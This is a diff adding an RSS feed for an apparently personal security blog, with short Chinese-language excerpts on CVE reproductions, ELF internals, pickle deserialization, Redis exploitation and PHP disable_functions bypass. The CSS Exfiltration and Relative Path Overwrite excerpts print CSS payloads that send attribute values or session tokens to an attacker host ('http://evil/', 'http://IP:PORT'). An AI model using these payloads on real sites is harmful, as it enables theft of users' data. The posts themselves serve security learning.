@@ -1,0 +1,271 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Jhe&#39;s blog</title>
+    <link>https://ucgjhe.github.io/</link>
+    <description>Recent content on Jhe&#39;s blog</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <lastBuildDate>Mon, 01 Feb 2021 01:10:25 +0800</lastBuildDate>
+    
+	<atom:link href="https://ucgjhe.github.io/index.xml" rel="self" type="application/rss+xml" />
+    
+    
+    <item>
+      <title>Breakdown MIPS binary exploit with Qdb</title>
+      <link>https://ucgjhe.github.io/post/breakdown_mips_binary_exploit_with_qdb/</link>
+      <pubDate>Mon, 01 Feb 2021 01:10:25 +0800</pubDate>
+      
+      <guid>https://ucgjhe.github.io/post/breakdown_mips_binary_exploit_with_qdb/</guid>
+      <description></description>
+    </item>
+    
+    <item>
+      <title>How to reproduce CVE-2020-8962 with Qiling Framework</title>
+      <link>https://ucgjhe.github.io/post/cve_2020_8962/</link>
+      <pubDate>Thu, 30 Jul 2020 10:25:15 +0800</pubDate>
+      
+      <guid>https://ucgjhe.github.io/post/cve_2020_8962/</guid>
+      <description>進行著每天例行的快速新聞瀏覽，偶然看見 CVE-2020-8962 是一個跟 D-Link 有關的漏洞，自從開始貢獻 Qiling Framework 開始就沒少碰過 D-Link 了，於似乎就想重現一下漏洞。
+下載最接近文章中所提及的版本後發現 binwalk 不認得，猜測是韌體被加密了，剛好之前做過一些韌體加解密的筆記，這邊就嘗試看看。
+Firmware decryption 韌體加解密有很多種情境詳細的就不多說了，這篇解釋得很清楚，這邊簡單的總結一下
+   情況 出廠版本 中間版本 最新版本 備註     一 加密0 加密0 加密0 從出廠開始就一直是加密的狀態，且未換過加解密演算法   二 加密0 未加密 加密1 出廠就加密了但廠商突然想要更換加解密演算法   三 未加密 加密0 加密0 出廠時未加密，之後基於某種原因釋出了有加密的版本    由上表可知，第一種情況是最棘手的，但要如何確定除了DIR-842的情況呢? 撇除買一台新機器的選項，由官網提供的韌體下載可以發現DIR-842最舊的版本是沒加密的，看來是中間某一個版本突然加密了，也就是說我們在情況三
+既然是情況三那就好辦了，必定存在一個中間版本是未加密且具有加解密演算法的，除了可以一個一個下載韌體使用 binwalk 暴力測試外，還可以透過 release note 來縮小範圍
+下圖是 DIR-842 RevC 3.13 版的 release note
+裡面提到若要升級到 3.13 版需要先安裝過度版本 v3.092b03_middle
+這裡就得到了關鍵版本的線索，這個過渡版本應該就是未加密且具有加解密演算法的韌體版本</description>
+    </item>
+    
+    <item>
+      <title>ELF Symbol Resolving</title>
+      <link>https://ucgjhe.github.io/post/elf_symbol_resolving/</link>
+      <pubDate>Thu, 12 Dec 2019 15:02:07 +0800</pubDate>
+      
+      <guid>https://ucgjhe.github.io/post/elf_symbol_resolving/</guid>
+      <description>這邊其實可以當成是 Lazy binding 的後篇，在 Lazy binding in ELF 中，只講到表層觀察到的現象
+也就是 GOT、PLT 等相交互的運作，但細部的如 function 是如何被&amp;quot;找&amp;quot;到的還是一個黑盒子
+這邊試著一步步用gdb手解一次並且留個紀錄
+Lab. 為了用 gdb 方便追蹤，這邊用自己編譯的 glibc
+實驗環境我用的是 ubuntu:16.04 in docker，下面是概略建置過程
+apt update apt install -y wget gcc-multilib gawk make libgetopt-complete-perl gdb vim wget https://ftp.gnu.org/gnu/libc/glibc-2.19.tar.gz tar zxvf glibc-2.19.tar.gz cd glibc-2.19.tar.gz &amp;amp;&amp;amp; mkdir build32 &amp;amp;&amp;amp; mkdir 32 cd build32 CC=&amp;quot;gcc -m32&amp;quot; CXX=&amp;quot;g++ -m32&amp;quot; CFLAGS=&amp;quot;-g -g3 -ggdb -gdwarf-4 -Og&amp;quot; CXXFLAGS=&amp;quot;-g -g3 -ggdb -gdwarf-4 -Og&amp;quot; ../configure --prefix=/root/glibc-2.19/32 --host=i686-linux-gnu make &amp;amp;&amp;amp; make install 下面是實驗使用到的 binary source code</description>
+    </item>
+    
+    <item>
+      <title>Python Pickle</title>
+      <link>https://ucgjhe.github.io/post/python_pickle/</link>
+      <pubDate>Thu, 30 May 2019 14:59:30 +0800</pubDate>
+      
+      <guid>https://ucgjhe.github.io/post/python_pickle/</guid>
+      <description>在 2018 年的時候有一個 Code-breaking Puzzles 挑戰賽，都是 Web 題，使用的語言橫跨 PHP、Nodejs、Java 與 python，用盡各語言的特性及奇技淫巧來解題
+唯一的一題用 Django 出的題目引起了我的興趣，起初環境不知道為什麼架不起來，後來雖然有了 Dockerfile 還是不看太清楚有什麼問題，看了一下設定檔可以猜出大概是反序列化問題，詳細的 write-up 可以在這邊看到
+總體來說先用 SSTI 洩漏 sign cookie 用的 SECRET key，再利用 getattr 函數取出被黑名單的函數來執行就大功告成了，但重點是一般在寫反序列化用的 payload 時一次只能執行一個函數，文章後面介紹如何透過手刻 pickle 的方式來解決這個問題
+Pickle 從 pickle.py、pickletools.py 與官方的文件中可以看到相關說明，Pickle 是一種協定用來將物件序列化為字串，並且有不同版本(0~4)，為了向下相容每個版本的 opcode 意義都相同，只差在新版的協議有較多的 opcode，且 protocol 0 的 opcode 都是可見字元，這邊人工寫的部分主要用這個版本的協定，可以在 pickle.py 中看到這些 opcode
+Pickle 透過 stack 與 memo 來執行，其中 stack 用來呼叫函數與存放參數，而 memo 是一個字典(dict) 結構，用來存放運行中碰到過的物件
+看看從一般序列化物件後 opcode 是如何
+class A(object): def __reduce__(self): return (print, (0, )) 這邊需要注意在 dumps 的時候需要指定 protocol 為 0，否則會使用預設的 protocol 版本</description>
+    </item>
+    
+    <item>
+      <title>Lazy binding in ELF</title>
+      <link>https://ucgjhe.github.io/post/lazy_binding_in_elf/</link>
+      <pubDate>Wed, 15 May 2019 14:58:16 +0800</pubDate>
+      
+      <guid>https://ucgjhe.github.io/post/lazy_binding_in_elf/</guid>
+      <description>ELF binary 透過 PLT(Procedure Linkage Table) 與 GOT(Global Offset Table) 達到延遲繫結來減少編譯所消耗的時間
+基本上就是在 runtime 需要用到該函數時，再將該函數&amp;quot;找&amp;quot;出來
+Global Offset Table GOT 分為兩部分 .got 與 .got.plt
+前者用來存放全域變數引用位置，後者存放函式引用位置
+.got.plt 前三項有特別用途
+ .dynamic 位置 link_map  有引用到的 libary 串成的 linked list   dl_runtime_resolve  後面的就是其他函式，未修正的話位址會指向 PLT 表的第二條指令
+已修正過後就會直接指向正確的函式位址
+Procedure Linkage Table PLT 是由程式中有用到的函式組成的表
+開頭的 PLT[0] 由兩條指令組成
+push *(GOT+4) # 將 link_map 壓入 stack jmp *(GOT+8) # jump 到 runtime_resolver 結束之後就會將正確的函式位址寫回 .got.plt
+Lazy binding 舉個解析 puts 的例子</description>
+    </item>
+    
+    <item>
+      <title>CSS Exfiltration</title>
+      <link>https://ucgjhe.github.io/post/css_exfiltration/</link>
+      <pubDate>Tue, 30 Apr 2019 14:53:31 +0800</pubDate>
+      
+      <guid>https://ucgjhe.github.io/post/css_exfiltration/</guid>
+      <description>雖然不是什麼新東西，但是覺得有趣就整理一下
+Why 隨著前端技術越發強大，CSS 也在其中佔有一席之地， CSS exfiltration 技巧也沒在 CTF 少出現過，當然有一些前提條件
+ 目標元素需要在瀏覽器載入網頁階段存在 需要有明確的屬性讓 css selector 可以取到該元素 取到元素之後要有辦法透過像是 background、background-image 等將資料傳遞出去(可能會被 CSP 限制)  假設目標存在CSS injection、HTML injection 卻無法執行 javascript 或是目標存在 RPO 弱點的話，這可能是一個可以考慮的方向，但仍需要視瀏覽器而定
+基本原理是透過 css selector 選取到對定的元素，並依照其屬性判斷來向遠端伺服器送出請求如:#target[value^=&amp;quot;s&amp;quot;]{backround: url(&amp;quot;http://evil/?s&amp;quot;)}，透過這只種方式只要有夠多的 css selector 便可以將目標屬性完全讀出來
+倘若目標屬性的長度較長抑或是複雜度較高(大小寫、數字英文、符號等)則需要的 css selector 便會大增，假設目標是純數字的 8 位密碼，便需要 P(10, 8) = 10!/2! = 1,814,400 這麼多項 css selector，另一方面一次性的大量載入 css 也可能會導致瀏覽器載入速度變慢導致使用者對攻擊&amp;quot;有感&amp;quot;
+有沒有一個方法可以透過跟伺服器互動的方式來減少一次性注入大量的 css 規則到目標瀏覽器中是否可能呢 ?
+How 這裡用到一個 Chrome 瀏覽器的特性，可以讓攻擊者使用 @import 引入一個遠端 CSS 就可以完成任務，使用下列的範例來解釋 Chrome 對 CSS 的解析順序</description>
+    </item>
+    
+    <item>
+      <title>Ptrace on Linux</title>
+      <link>https://ucgjhe.github.io/post/ptrace_on_linux/</link>
+      <pubDate>Mon, 15 Apr 2019 14:51:02 +0800</pubDate>
+      
+      <guid>https://ucgjhe.github.io/post/ptrace_on_linux/</guid>
+      <description>一直都有想要寫相關的紀錄但一直都沒有時間，直到又看到類似應用的工具才想到把之前想要紀錄的通通寫上來
+ptrace 在 Linux 上是一個強大的存在，允許一個 process 除錯另外一個 process，像是 GDB 就是基於 ptrace 來運作的
+How 看到了有人分享類似 sudohulk、sudo_inject 這種工具， 起初看到描述的時候覺得很神，於是去看了 code 了解一下原理，終究發現是需要使用 ptrace 來達到這種效果，但仍然受限於 Yama Security Module，可以透過更改kernel.yama.ptrace_scope的數值來決定 ptrace 可以附加的對象，數值及對應效果如下表
+   數值 效果     0 只要有相同的 uid，所有的 process 都可以被 debug   1 只有 parent process 可以 debug 自己的 child process   2 只有管理者可以用 ptrace，需要有 CAP_SYS_PTRACE 能力   3 沒有 process 可以被 ptrace，啟用後就改不回來了(root 也不行)除非重開機    在我慣用的 Linux 發行版裡 (Arch, Ubuntu) 預設至少都有 1，難道有發行版預設是 0 ?</description>
+    </item>
+    
+    <item>
+      <title>Redis Security</title>
+      <link>https://ucgjhe.github.io/post/redis_security/</link>
+      <pubDate>Mon, 01 Apr 2019 14:47:44 +0800</pubDate>
+      
+      <guid>https://ucgjhe.github.io/post/redis_security/</guid>
+      <description>Redis 是一個 in-memory 的開源專案，使用 key-value 的形式來儲存資料，常被用來當作資料庫或是 cache 使用，並透過 rdb 與 aof 機制來作到 persistence，rdb 用來存儲資料庫中的資料，而 aof 則是 log 檔，當 appendonly 為 yes 時，會將對 Redis 的操作 log 到 appendonly.aof 檔中。
+預設的 service port 是 6379，版本 &amp;gt;= 3.2.7 之後偵測到指令裡面有 HOST 或是 POST 關鍵字會 abort connection，並且在版本 &amp;gt;= 3.2.0 預設開啟 protected mode，代表當沒有 bind 到任何 IP 位址且沒有密碼要求時，只有 IPv4、IPv6 的 loopback 或 Unix socket 可以訪問該 Redis。
+Exploit 除了 memory corruption 相關的 CVE 弱點外，redis open port 還可以透過以下方式來 exploit</description>
+    </item>
+    
+    <item>
+      <title>Relative Path Overwrite</title>
+      <link>https://ucgjhe.github.io/post/relative_path_overwrite/</link>
+      <pubDate>Fri, 01 Mar 2019 14:45:48 +0800</pubDate>
+      
+      <guid>https://ucgjhe.github.io/post/relative_path_overwrite/</guid>
+      <description>在前端網頁引入資源(javascript, CSS)時使用相對路徑，並因為客戶端瀏覽器與伺服端解析之差異所造成的問題，可能造成瀏覽器執行預期外的 javascript 或 CSS。
+當 Apache 啟用 AllowEncodedSlashes On 或是使用 Nginx 的時候，後端伺服器會將 ..%2f 解析成 ../，但瀏覽器則會把它當成檔名的一部分，且當頁面引入資源使用相對路徑時，將造成瀏覽器與伺服器的解析不一致。
+Lab. 範例目錄結構
+index.php test/ - a.js index.html 程式碼
+&amp;lt;html&amp;gt; &amp;lt;script src=a.js&amp;gt;&amp;lt;/script&amp;gt; &amp;lt;/html&amp;gt; a.js 程式碼
+alert(1) 使用相對路徑引入一個名為 a.js 的 javascript，但其實 a.js 存在於 test 目錄下
+訪問首頁後一切正常，嘗試訪問 http://IP/test/..%2findex.html 神奇的事情發生了，alert(1) 跳了出來。
+ 瀏覽器向伺服器發出 http://IP/test/..%2findex.html 請求 伺服器將 ..%2f 轉換成 ../ 所以伺服器看到的是 http://IP/test/../index.html，所以伺服器返回的是 http://IP/index.html 的內容 瀏覽器並不會自動轉義 ..%2f 只是將之當成檔案名稱送出，收到伺服器回應後，瀏覽器依照相對路徑引入資源 a.js ，對於瀏覽器來說，當前目錄應該是 test 於是送出 http://IP/test/a.js 請求  可以用一些 CSS 的黑魔法來讀取頁面內容，或是取得瀏覽者的 session token {} @import url(http://IP:PORT); {} * {background: url(http://IP:PORT);}</description>
+    </item>
+    
+    <item>
+      <title>CVE-2018-20250</title>
+      <link>https://ucgjhe.github.io/post/cve_2018_20250/</link>
+      <pubDate>Wed, 27 Feb 2019 14:42:41 +0800</pubDate>
+      
+      <guid>https://ucgjhe.github.io/post/cve_2018_20250/</guid>
+      <description>這幾天到處都看到在講這個藏了 19 年的 Winrar 洞，於似乎跟風復現一波
+問題出現在 WinRAR 在解壓縮 WinACE 檔的時候使用的 unacev2.dll 處理有問題
+導致 Path Traversal，攻擊者可以將檔案放到任意目錄下(有權限且路徑存在的話)
+Lab. 復現步驟如下:
+ 使用 WinACE 軟體壓縮一個檔案，檔名要夠長(重寫用到，否則檔案大小會有問題) 壓縮的時候要選 store full path 使用任意 hex editor 將路徑名稱改成自己想要的 使用 acefile.py --headers FILE，他會很好心的跟你說你的 CRC 錯惹，應該是多少 將 CRC 改成正確的值 使用 WinRAR 解壓縮該檔案  文中提到他們找到一個 SMB attack vector，也就是說又找到了一種方式拿 NTLM hash 就對了
+或是使用類似 ../../ 這種方式來把檔案放到你想要的地方，相關的分析前因後果，文章中都有這就不細講了
+Conclusion 更新至 WinRAR 5.7 beta 之後的版本即可免於危害
+References  Extracting a 19 Year Old Code Execution from WinRAR WinRAR目录穿越神洞复现及防御  </description>
+    </item>
+    
+    <item>
+      <title>PHP 繞過 disable_functions 踩坑記</title>
+      <link>https://ucgjhe.github.io/post/bypass_disable_functions/</link>
+      <pubDate>Sat, 05 Jan 2019 14:40:22 +0800</pubDate>
+      
+      <guid>https://ucgjhe.github.io/post/bypass_disable_functions/</guid>
+      <description>最近看到很多文章講到 bypass PHP disable functions 的文章，但其實這也不是什麼新的東西了
+很久以前就蒐集到過不少相關的文章，印象中最早從現在已經萬年維修的 wooyun drops 看到相關文章
+當然也已經有整理很齊全的github，於似乎就順手整理相關資料順便重現一波
+Lab. 文章提到想要繞過 PHP 的 disable funtioncs 大概有四種方法
+ 可能有一些沒 disable 到的漏網之魚 透過第三方程式弱點像是 ImageMagick 或 Shellshock 等等 apache 啟用了 mod_cgi 並且允許覆蓋 .htaccess 透過設定環境變數 LD_PRELOAD 來 hijack 系統層級函式  這篇踩坑記主要在第四點上
+根據 wooyun drops 的文章來看，中心思想就是使用 putenv 設定 LD_PRELOAD
+然後使用 mail 函數會用到系統 sendmail binary 的特性導致 function hijack，進而
+繞過 PHP 的 disable functions，但缺點是你必須要覆蓋到會使用到的 function
+否則就無法觸發，而 freebuf 的這篇 无需sendmail：巧用LD_PRELOAD突破disable_functions
+提到使用編譯器提供的 attribute 屬性來優先執行，這樣就可以無需覆蓋到任何函數一樣可以達到效果
+甚至系統最後沒有 sendmail 也無妨，在這一次重現中，主要測試了兩個運行方法，PHP CLI 與</description>
+    </item>
+    
+    <item>
+      <title>Blueborne</title>
+      <link>https://ucgjhe.github.io/post/blueborne/</link>
+      <pubDate>Thu, 22 Nov 2018 14:38:27 +0800</pubDate>
+      
+      <guid>https://ucgjhe.github.io/post/blueborne/</guid>
+      <description>Blueborne 為 Armis Lab 提出的八個與藍芽相關的 CVE 弱點 此攻擊無須使用者介入(接受藍芽配對、點擊連結、主動發起請求&amp;hellip;)，只需要使用者開啟藍芽功能即可，這聽起來非常高大上好厲害的樣子。
+八個 CVE 及其影響分別如下表
+   CVE 編號 平台 影響     2017-0781 Android DoS or RCE   2017-0782 Android Integer Underflow   2017-0783 Android MiTM   2017-0785 Android Information Leak   2017-8628 Windows MiTM   2017-14315 iOS RCE   2017-1000250 Linux Information Leak   2017-1000251 Linux RCE    Armis Lab 使用 CVE-2017-0781 及 CVE-20170785 來達成 RCE，PoC 在此，下面就描述一下我復現的過程與踩到的坑。</description>
+    </item>
+    
+    <item>
+      <title>CVE-2017-11610</title>
+      <link>https://ucgjhe.github.io/post/cve_2017_11610/</link>
+      <pubDate>Sun, 30 Sep 2018 14:34:37 +0800</pubDate>
+      
+      <guid>https://ucgjhe.github.io/post/cve_2017_11610/</guid>
+      <description>雖然不是什麼新東西，但覺得有點有趣所以筆記一篇
+Supervisord Supervisord 是一個使用 Python 寫的 C/S 架構的行程管控系統，由 supervisorctl 當 CLI 界面、supervisord 當伺服端，並使用XML-RPC來通訊，預設情況下 supervisord 監聽的是 unix socket，也可以將 listen port 改成 TCP，改成TCP後的預設 port 是 9001。
+分析 先用 vulhub 將弱點環境架起來，完成後進到容器裡查看一下當前運行的行程
+可以發現使用 python 執行了 /usr/local/bin/supervidord 該檔案內容為
+#!/usr/local/bin/python # -*- coding: utf-8 -*- import re import sys from supervisor.supervisord import main if __name__ == &amp;#39;__main__&amp;#39;: sys.argv[0] = re.sub(r&amp;#39;(-script\.pyw?|\.exe)?$&amp;#39;, &amp;#39;&amp;#39;, sys.argv[0]) sys.exit(main()) 查看 supervisord.py 的 main function
+看到 361 行執行 go function 將設定檔帶入 class Supervisor 中，並呼叫 main function</description>
+    </item>
+    
+    <item>
+      <title>Length extension attack</title>
+      <link>https://ucgjhe.github.io/post/length_extension_attack/</link>
+      <pubDate>Tue, 25 Apr 2017 14:32:40 +0800</pubDate>
+      
+      <guid>https://ucgjhe.github.io/post/length_extension_attack/</guid>
+      <description>在 CTF 算是常見的 crypto 題型，但是現實生活中卻幾乎沒看過實際應用例子 . . .
+主要受影響的 hash 演算法為 MD5 及 SHA1, 本文以 MD5 為例
+弱點成因  MD5, SHA1 使用同一種壓縮演算法(Merkle–Damgård construction)  利用情境  已知 md5(secret || message) 結果 未知 secret 的前提下，可以計算出 md5(secret || message || append)  原理解析  MD5 會將訊息以 64 bytes 為一個 block 做分區，每個 block 做完 某種複雜的計算 後得到該回合(round) 的狀態值 使用 A, B, C, D 四個 register 儲存䅮一回合的狀態 以 0x80 表示 message 結尾，利用 0x00 padding 直到滿足 len(message) % 64 bytes = 56 bytes 第 57 個 byte 用來表示 message 長度，hex(len(message) * 8) # 以 bit 為單位 用 0x00 補滿直到 64 bytes  攻擊原理  其實所謂的狀態值就是該 block 的 hash 結果，最終的 md5 輸出亦同 每八個 digits 一組以 little endian 方式排列分別賦值給 A, B, C, D padding 到下一個 block 加上額外訊息  PoC #include &amp;lt;stdio.</description>
+    </item>
+    
+    <item>
+      <title>LD_PRELOAD</title>
+      <link>https://ucgjhe.github.io/post/ld_preload/</link>
+      <pubDate>Fri, 14 Apr 2017 14:29:21 +0800</pubDate>
+      
+      <guid>https://ucgjhe.github.io/post/ld_preload/</guid>
+      <description>Hook 機制在不同的層面上有不同的作法
+LD_PRELOAD 可以讓你預先載入自己的 shared object 檔，如此一來就可以在某些我們感興趣的 function 動手腳
+// main.c #include &amp;lt;stdio.h&amp;gt; int main(void) { puts(&amp;#34;Hello world!&amp;#34;); return 0; } main.c 是一個很簡單的 hello world 程式，很多初學者的第一個程式範例
+很明顯該程式中只有一個 puts function 也就是我們的目標
+首先透過 man 來查詢 puts 的宣告 man 3 puts
+得知是 int puts(const char *s)
+我們便需要宣告一個跟它一模一樣的 function pointer 來存放
+// hook.c #define _GNU_SOURCE #include &amp;lt;stdio.h&amp;gt;#include &amp;lt;dlfcn.h&amp;gt;#include &amp;lt;string.h&amp;gt; int puts(const char *s) { int *(*old_puts)(const char *msg); old_pust = dlsym(RTLD_NEXT, &amp;#34;puts&amp;#34;); printf(&amp;#34;length of messages: %zu\n&amp;#34;, strlen(s)); return old_puts(s); } $ cc -o main main.</description>
+    </item>
+    
+    <item>
+      <title>JWT</title>
+      <link>https://ucgjhe.github.io/post/jwt/</link>
+      <pubDate>Mon, 03 Apr 2017 14:26:47 +0800</pubDate>
+      
+      <guid>https://ucgjhe.github.io/post/jwt/</guid>
+      <description>JOSE(JSON Object Signing and Encryption) 定義了一系列的 RFC 標準
+目前有：
+ JSON Web Signature JSON Web Encryption JSON Web Key JSON Web Algorithm JSON Web Token  JWT (JSON Web Token) 算是集前面大成者(?)
+詳細的介紹可以看這裡，這邊直接從 JWT 切入
+每個 JWT 稱為一個 claim，每個 claim 組成為分別為 header.payload.signature (注意它使用 &amp;lsquo;.&amp;rsquo; 來虛隔三者)
+Header
+{ &amp;#34;typ&amp;#34;: &amp;#34;JWT&amp;#34;, &amp;#34;alg&amp;#34;: &amp;#34;HS256&amp;#34; } typ 代表使用 JWT
+alg 代表signature 演算法使用 HS256
+Payload
+{ &amp;#34;iss&amp;#34;: &amp;#34;&amp;#34;, &amp;#34;sub&amp;#34;: &amp;#34;&amp;#34;, &amp;#34;aud&amp;#34;: &amp;#34;&amp;#34;, &amp;#34;exp&amp;#34;: &amp;#34;&amp;#34;, &amp;#34;nbf&amp;#34;: &amp;#34;&amp;#34;, &amp;#34;iat&amp;#34;: &amp;#34;&amp;#34;, &amp;#34;jti&amp;#34;: &amp;#34;&amp;#34; } payload 中的 data 有明確的欄位定義</description>
+    </item>
+    
+    <item>
+      <title>GCC Inline Assembly</title>
+      <link>https://ucgjhe.github.io/post/gcc_inline_assembly/</link>
+      <pubDate>Sun, 26 Mar 2017 14:18:34 +0800</pubDate>
+      
+      <guid>https://ucgjhe.github.io/post/gcc_inline_assembly/</guid>
+      <description>因為想要在 C 裡寫一些組合語言，所以就研究了一下怎麼寫，發現事情並不是像我想的這麼簡單故筆記之。
+GCC 准許我們使用行內組語依照如下格式
+asm(&amp;#34;asm template&amp;#34; // 組合語言 	:output operands //(optional) 輸出運算元  :input operands //(optional) 輸入運算元  :list of clobbered registers //(optional) 被更動的暫存器 組合語言使用雙引號 (&amp;quot;) 包住，若為多行組語則須在結尾加上 \n\t 最後一行除外
+因為 GCC 將組語一行一行指令當成字串
+以下為簡單範例
+#include &amp;lt;stdio.h&amp;gt; // simple.cint main(void) { int foo=10, bar=5, result; asm(&amp;#34;add ebx, eax&amp;#34;:&amp;#34;=b&amp;#34;(result):&amp;#34;a&amp;#34;(foo), &amp;#34;b&amp;#34;(bar)); printf(&amp;#34;foo + bar = %d\n&amp;#34;, result); return 0; } 範例中 a 就代表 eax, b 表示 ebx 其他以此類推
+然後編譯一下 gcc -o simple simple.</description>
+    </item>
+    
+    <item>
+      <title>Hello World</title>
+      <link>https://ucgjhe.github.io/post/hello_world/</link>
+      <pubDate>Sat, 25 Mar 2017 11:51:19 +0800</pubDate>
+      
+      <guid>https://ucgjhe.github.io/post/hello_world/</guid>
+      <description>Hello, World!</description>
+    </item>
+    
+  </channel>
+</rss>
